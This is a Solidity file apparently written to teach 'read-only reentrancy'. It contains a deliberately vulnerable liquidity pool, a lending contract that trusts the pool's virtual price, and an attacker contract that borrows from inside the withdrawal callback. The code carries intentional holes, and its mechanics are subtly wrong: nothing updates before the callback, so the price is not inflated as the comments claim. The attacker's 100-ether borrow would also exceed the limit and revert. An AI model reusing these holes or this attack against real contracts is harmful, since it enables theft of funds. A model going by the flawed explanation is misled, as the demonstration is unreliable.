// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Curve Read-Only Reentrancy
 * @notice Multiple protocols lost $70M+ due to this pattern
 * 
 * ROOT CAUSE: Curve's get_virtual_price() can return stale values during
 * reentrancy. When removing liquidity, ETH is sent to user BEFORE state
 * updates. If the user's fallback reads virtual_price, they get wrong value.
 */

interface ICurvePool {
    function get_virtual_price() external view returns (uint256);
    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint) external payable returns (uint256);
    function remove_liquidity(uint256 lp_amount, uint256[2] calldata min_amounts) external returns (uint256[2] memory);
}

/**
 * @notice Simplified Curve pool showing the read-only reentrancy issue
 */
contract VulnerableCurvePool {
    uint256 public totalSupply;
    uint256 public reserve0; // ETH
    uint256 public reserve1; // Token
    
    mapping(address => uint256) public balanceOf;
    
    /**
     * @notice Get the "fair" price of LP tokens
     * @dev VULNERABLE: Returns stale value during reentrancy
     */
    function get_virtual_price() external view returns (uint256) {
        if (totalSupply == 0) return 1e18;
        // This calculation uses current reserves, which may be stale
        // during a callback in remove_liquidity
        return (reserve0 + reserve1) * 1e18 / totalSupply;
    }
    
    function add_liquidity(uint256 tokenAmount) external payable returns (uint256 lpAmount) {
        reserve0 += msg.value;
        reserve1 += tokenAmount;
        
        lpAmount = msg.value; // Simplified
        balanceOf[msg.sender] += lpAmount;
        totalSupply += lpAmount;
    }
    
    /**
     * @notice VULNERABLE: ETH sent before state update
     */
    function remove_liquidity(uint256 lpAmount) external returns (uint256 ethAmount, uint256 tokenAmount) {
        require(balanceOf[msg.sender] >= lpAmount, "Insufficient LP");
        
        ethAmount = lpAmount * reserve0 / totalSupply;
        tokenAmount = lpAmount * reserve1 / totalSupply;
        
        // BUG: External call BEFORE state updates
        // During this call, get_virtual_price() returns WRONG value
        // because reserves haven't been updated yet
        (bool success,) = msg.sender.call{value: ethAmount}("");
        require(success, "ETH transfer failed");
        
        // State updates happen AFTER the callback
        reserve0 -= ethAmount;
        reserve1 -= tokenAmount;
        balanceOf[msg.sender] -= lpAmount;
        totalSupply -= lpAmount;
    }
}

/**
 * @notice Vulnerable lending protocol that uses Curve virtual_price
 */
contract VulnerableLendingProtocol {
    ICurvePool public curvePool;
    
    mapping(address => uint256) public collateralLP;
    mapping(address => uint256) public debt;
    
    uint256 public constant LTV = 80; // 80% loan-to-value
    
    constructor(address _curvePool) {
        curvePool = ICurvePool(_curvePool);
    }
    
    function depositCollateral(uint256 lpAmount) external {
        collateralLP[msg.sender] += lpAmount;
    }
    
    /**
     * @notice VULNERABLE: Reads virtual_price which can be stale during reentrancy
     */
    function borrow(uint256 amount) external {
        // This reads virtual_price - VULNERABLE during Curve reentrancy
        uint256 lpValue = collateralLP[msg.sender] * curvePool.get_virtual_price() / 1e18;
        uint256 maxBorrow = lpValue * LTV / 100;
        
        require(debt[msg.sender] + amount <= maxBorrow, "Exceeds borrow limit");
        debt[msg.sender] += amount;
        
        // Transfer borrowed funds...
    }
}

/**
 * @notice Attacker exploiting read-only reentrancy
 */
contract ReadOnlyAttacker {
    VulnerableCurvePool public curve;
    VulnerableLendingProtocol public lending;
    
    constructor(address _curve, address _lending) {
        curve = VulnerableCurvePool(_curve);
        lending = VulnerableLendingProtocol(_lending);
    }
    
    function attack() external {
        // 1. Add liquidity to Curve
        curve.add_liquidity{value: 10 ether}(10 ether);
        
        // 2. Deposit LP to lending protocol
        lending.depositCollateral(10 ether);
        
        // 3. Remove liquidity - triggers callback
        curve.remove_liquidity(10 ether);
    }
    
    // Called during remove_liquidity, before state updates
    receive() external payable {
        // At this moment, virtual_price is INFLATED because:
        // - We received ETH (reserve0 not updated yet)
        // - LP tokens not burned yet
        // So our collateral appears worth MORE than it is
        
        // Borrow maximum against inflated collateral value
        lending.borrow(100 ether); // Borrow more than we should be able to
    }
}
